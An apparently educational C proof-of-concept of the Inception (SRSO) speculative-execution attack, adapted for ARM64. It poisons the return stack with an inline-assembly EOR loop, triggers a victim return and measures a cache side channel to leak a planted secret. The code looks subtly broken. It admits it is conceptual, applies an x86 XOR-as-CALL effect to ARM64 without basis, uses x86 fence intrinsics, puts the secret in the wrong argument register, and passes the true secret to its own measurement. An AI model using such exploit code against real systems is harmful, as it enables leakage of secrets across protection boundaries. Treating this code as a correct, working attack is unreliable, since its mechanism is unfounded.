#include "utils_arm64.c"

// --- Inception (Speculative Return Stack Overflow - SRSO) ---
// ARM64-compatible version

uint8_t secret_inception_data = 'I'; // Secret to leak

// Gadget function to leak a byte
// This function will be called speculatively when RAS is poisoned
__attribute__((noinline)) void leak_gadget_inception(uint8_t value)
{
    // Use the secret value to access the probe array
    // This creates a cache side-channel that can be measured
    probe_array[value * CACHE_LINE_SIZE] = 1;

    // Add some computation to make the speculative execution more realistic
    volatile int dummy = value * 2;
    (void)dummy; // Suppress unused variable warning
}

// Victim function with a return instruction that will be misdirected speculatively.
// In a real attack, this would be a function in the victim's code that the attacker
// can trigger to execute a return instruction.
__attribute__((noinline)) void victim_function_inception()
{
    volatile int dummy = 0;
    for (int i = 0; i < 10; ++i)
    {
        dummy += i;
    }
    // The return instruction here is the target of the attack
    // When the CPU speculatively executes this return, it should use
    // the poisoned RAS entry (our gadget address) instead of the real return address
    (void)dummy; // Suppress unused variable warning
}

int main()
{
    common_init();
    printf("\n--- Running Inception (SRSO) Demo (ARM64-compatible) ---\n");

    // --- Poisoning Phase ---
    // This is the most architecture-specific part for Inception.
    // It involves causing a large number of "phantom CALLs" via specific instruction sequences.
    // The ETH Zurich paper points to XOR instructions being speculatively interpreted as CALLs.
    // This requires precise inline assembly to construct the "trigger code."
    printf("Triggering phantom speculation to overflow RAS...\n");
    printf("Setting up x8 with gadget address: %p\n", (void *)&leak_gadget_inception);
    printf("Setting up x9 with secret data: %c (0x%02x)\n", secret_inception_data, secret_inception_data);

    // The actual code would be a highly-tuned inline assembly loop.
    // Example (conceptual, not guaranteed to work on any specific CPU):
    // The goal is to repeatedly execute instructions that ARM64 CPUs speculatively
    // misinterpret as CALLs, causing the RAS to be filled.
    // The addresses pushed onto the RAS are the attacker's "poison" values,
    // typically pointers to the `leak_gadget_inception`.

    // For a C-level conceptualization, we can only describe the goal:
    // Fill the RAS with `leak_gadget_inception` address.
    // This might involve:
    // 1. Setting up registers so that the "phantom CALL" uses `leak_gadget_inception` as target.
    // 2. Repeatedly executing a sequence of instructions (like `EOR`) that are known to
    //    trigger the phantom `CALL` behavior on the target ARM64 CPU.

    // Set up registers for the attack
    // x8 will contain the gadget address, x9 will contain the secret
    // Load registers using a simpler approach
    register void *gadget_addr asm("x8") = &leak_gadget_inception;
    register uint8_t secret_val asm("x9") = secret_inception_data;

    __asm__ __volatile__(
        ".rept 256\n\t"      // Repeat many times to overflow RAS
        "eor x0, x0, x0\n\t" // This might be speculatively interpreted as CALL
        "nop\n\t"            // Padding
        "nop\n\t"
        "nop\n\t"
        ".endr\n"
        :
        :
        : "x0", "x8", "x9");
    _mm_mfence(); // Ensure RAS updates are visible globally

    // After poisoning, flush caches to remove noise from training.
    flush_probe_array();
    _mm_mfence();

    // --- Attack Phase ---
    flush_probe_array();
    _mm_lfence();

    printf("Triggering victim function with return...\n");

    // Ensure registers are still loaded with our values
    gadget_addr = &leak_gadget_inception;
    secret_val = secret_inception_data;

    // Call the victim function - its return instruction should be misdirected
    victim_function_inception(); // This will execute a 'ret' instruction.
                                 // Speculatively, due to poisoned RAS, it returns to gadget.
                                 // The gadget will be called with the secret in x9 as parameter.

    // Add a fence to ensure speculative effects propagate to cache
    _mm_lfence();

    // --- Measurement Phase ---
    perform_measurement(secret_inception_data, "Inception secret");
    printf("Actual secret data: %c\n", secret_inception_data);
    return 0;
}